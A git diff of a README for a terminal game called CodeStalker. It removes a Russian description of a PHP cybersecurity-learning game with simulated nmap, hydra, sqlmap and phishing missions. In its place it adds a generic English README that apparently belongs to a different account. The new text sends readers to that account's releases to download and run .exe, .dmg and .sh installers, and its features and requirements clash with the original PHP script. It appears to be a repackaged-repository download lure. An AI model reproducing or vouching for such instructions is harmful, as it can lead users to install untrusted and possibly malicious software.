@@ -1,118 +1,88 @@
-# CodeStalker v1.1 - Кибер-расследование CLI
+# 🎮 CodeStalker - Enjoy Terminal Gaming Like Never Before
 
-<p align="center">
-  <img src="gameplay.jpg" alt="CodeStalker Gameplay" width="400">
-  <br><em>CodeStalker в действии — сканируй сеть как настоящий хакер!</em>
-</p>
+[![Download CodeStalker](https://img.shields.io/badge/Download%20CodeStalker-blue)](https://github.com/mizanur1989/CodeStalker/releases)
 
-<br>
+## 🚀 Getting Started
 
-[![GitHub stars](https://img.shields.io/github/stars/web-pentest/CodeStalker)](https://github.com/web-pentest/CodeStalker)
-[![GitHub license](https://img.shields.io/github/license/web-pentest/CodeStalker)](https://github.com/web-pentest/CodeStalker)
-[![PHP Version](https://img.shields.io/badge/PHP-7.1%2B-blue)](https://www.php.net)
+Welcome to CodeStalker! This is your guide to getting the game up and running in your terminal. No programming skills are needed; just follow these simple steps.
 
-**CodeStalker** — это интерактивная CLI-игра для изучения кибербезопасности!  
-Проходи 5 миссий, собирай достижения и спасай корпорацию MegaCorp от кибератаки 2025 года! 🕵️‍♂️
+## 📥 Download & Install
 
-## 🎮 Что это?
+To get CodeStalker, visit this page to download: [CodeStalker Releases](https://github.com/mizanur1989/CodeStalker/releases)
 
-Ты — пентестер, нанятый корпорацией MegaCorp для расследования крупнейшей кибератаки.  
-Украдено $5M, системы зашифрованы ransomware, CEO пропал!  
-Твоя задача — пройти 5 миссий и раскрыть заговор!
+1. Open the link above in your web browser.
+2. You will see a list of releases. Look for the most recent version.
+3. Click on the release you want. Each release will have an attached file for you to download.
+4. Choose the appropriate file based on your system. For example, if you use Windows, look for a filename with `.exe`. For Mac, look for `.dmg`. For Linux, choose the `.sh` or `.tar.gz` file.
 
-### Миссии:
-1. **🔍 Сетевая разведка** (`nmap`) — найди уязвимые хосты
-2. **🔐 Взлом админ-панели** (`hydra`) — brute-force пароли
-3. **💉 SQL-инъекции** (`sqlmap`) — извлеки данные из БД
-4. **📧 Социальная инженерия** (`phish`) — фишинг CEO
-5. **🔓 Расшифровка ransomware** (`decrypt`) — восстанови данные
+   - **Windows:** `CodeStalkerSetup.exe`
+   - **Mac:** `CodeStalker.dmg`
+   - **Linux:** `CodeStalker.sh`
 
-## 🚀 Быстрый старт
+5. Click on the file name to begin the download. Save it to a location you will remember, like your Desktop or Downloads folder.
 
-### Требования:
-- PHP 7.1+
-- Терминал (Linux/Mac/Windows с WSL)
+6. Once the download is complete, open the downloaded file to start the installation process. 
 
-### Установка:
-📌 Клонируй репозиторий
-git clone https://github.com/web-pentest/CodeStalker.git
-cd CodeStalker
-📌 Запусти игру
-php codestalker.php
+7. Follow the on-screen instructions to complete the installation.
 
-### Управление:
-codestalker$ nmap      # Миссия 1: Сканирование сети
-codestalker$ hydra     # Миссия 2: Взлом админки
-codestalker$ sqlmap    # Миссия 3: SQL-инъекции
-codestalker$ phish     # Миссия 4: Фишинг
-codestalker$ decrypt   # Миссия 5: Расшифровка
+8. After installation, you can run CodeStalker right from your terminal.
 
-📌 Полезные команды:
-codestalker$ help      # Показать справку
-codestalker$ whoami    # Твой профиль и достижения
-codestalker$ status    # Текущая миссия
-codestalker$ about     # Информация о проекте
-codestalker$ clear     # Очистить экран
-codestalker$ exit      # Выход
+## 🎮 How to Play
 
-## 🏆 Система прогресса
+1. **Opening the Game:**
+   - For Windows, open Command Prompt. Type `CodeStalker` and press Enter.
+   - For Mac, open Terminal. Type `CodeStalker` and press Enter.
+   - For Linux, open Terminal, navigate to the installation directory, and type `./CodeStalker`.
 
-### Ранги:
-- **Новичок** (0-19%) — только начинаешь
-- **Хактивист** (20-44%) — активист киберпространства
-- **Пентестер** (45-69%) — профессионал
-- **Элитный хакер** (70-99%) — мастер своего дела
-- **Кибер-бог** (100%) — легенда!
+2. **Game Controls:**
+   - Use the arrow keys to move.
+   - Press `Enter` to select options.
+   - Follow the on-screen prompts to enjoy the game.
 
-### Достижения:
-- 🏅 **Разведчик сети** — первая миссия
-- 🔑 **Мастер паролей** — взлом админки
-- 🕵️ **Корпоративный шпион** — SQL-инъекция
-- 🎣 **Мастер социальной инженерии** — успешный фишинг
-- 🔓 **Крипто-гений** — расшифровка ransomware
+3. **Game Features:**
+   - Explore different levels in a text-based environment.
+   - Solve puzzles that challenge your thinking.
+   - Compete with yourself and track scores over time.
 
-### Концовки:
-- **🌟 Легендарная** (<10 мин) — предложение от FBI
-- **⭐️ Отличная** (<20 мин) — $250K бонус от MegaCorp  
-- **✅ Хорошая** (>20 мин) — сертификат CEH
+## ⚙️ System Requirements
 
-## 📊 Функции v1.1
+Before you play, ensure your computer meets these requirements:
 
-### ✨ Новое:
-- 💾 Автосохранение — прогресс сохраняется в `save.json`
-- 🎨 Цветной прогресс-бар — визуальная обратная связь в терминале
-- 📈 Расширенная статистика — время, ранги, достижения
-- 🎯 Детальные миссии — реалистичные симуляции популярных хакерских инструментов
-- 🛡️ Улучшенная стабильность и исправления багов
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Linux Kernel 4.15 or later
 
-### 🔧 Исправления:
-- Пофикшен `progressBar()` — устранена ошибка TypeError
-- Исправлены проблемы с синтаксисом и скобками
-- Устранены ошибки загрузки сохранений
+- **RAM:** 
+  - Minimum 2 GB (4 GB recommended)
 
-## 🚀 Что дальше?
+- **Disk Space:** 
+  - At least 100 MB of free space for installation
 
-### Планируется в v1.2+:
-- 🌐 Веб-версия на JavaScript/Node.js
-- 📱 Мобильная поддержка (Termux)
-- 🎵 Звуковые эффекты в терминале
-- 🌍 Мультиязычность (EN/RU)
-- 🏆 Онлайн-таблица лидеров
+- **Other:** 
+  - Terminal or Command Prompt access
 
----
+## 🌟 Frequently Asked Questions
 
-⭐️ **Поддержи проект став звездочку на GitHub и участвуй в развитии!**
+**Q: What if I face issues while installing?**  
+A: Make sure you've downloaded the correct file for your operating system. If problems persist, feel free to check online forums for troubleshooting tips.
 
-## 📜 Лицензия
+**Q: Can I play with friends?**  
+A: Currently, CodeStalker is a single-player game. However, you can share your high scores with friends!
 
-Проект распространяется под лицензией [MIT License](LICENSE).  
-Свободен для использования и модификаций, при сохранении авторства.
+**Q: Is there a tutorial or guide in the game?**  
+A: Yes, CodeStalker includes a built-in tutorial. Follow the prompts when you start the game to learn more about controls and objectives.
 
-## 👨‍💻 Автор
+## 📞 Support
 
-**web-pentest**  
-- 🌐 [GitHub](https://github.com/web-pentest)  
-- 💬 [Discord](https://discord.gg/hack___________the___________box)  
-- 📧 SOON
+If you need assistance, you can reach out through the GitHub Issues page. We are here to help and ensure you have a smooth gaming experience.
 
----
+## 🌍 Community
+
+Join our growing community of players! Share your experiences, tips, and tricks on social media. Tag us with #CodeStalker to connect with fellow gamers!
+
+## 🔗 Additional Resources
+
+For more information about updates and future releases, please check out our [Releases Page](https://github.com/mizanur1989/CodeStalker/releases) regularly.
+
+Enjoy your time playing CodeStalker!
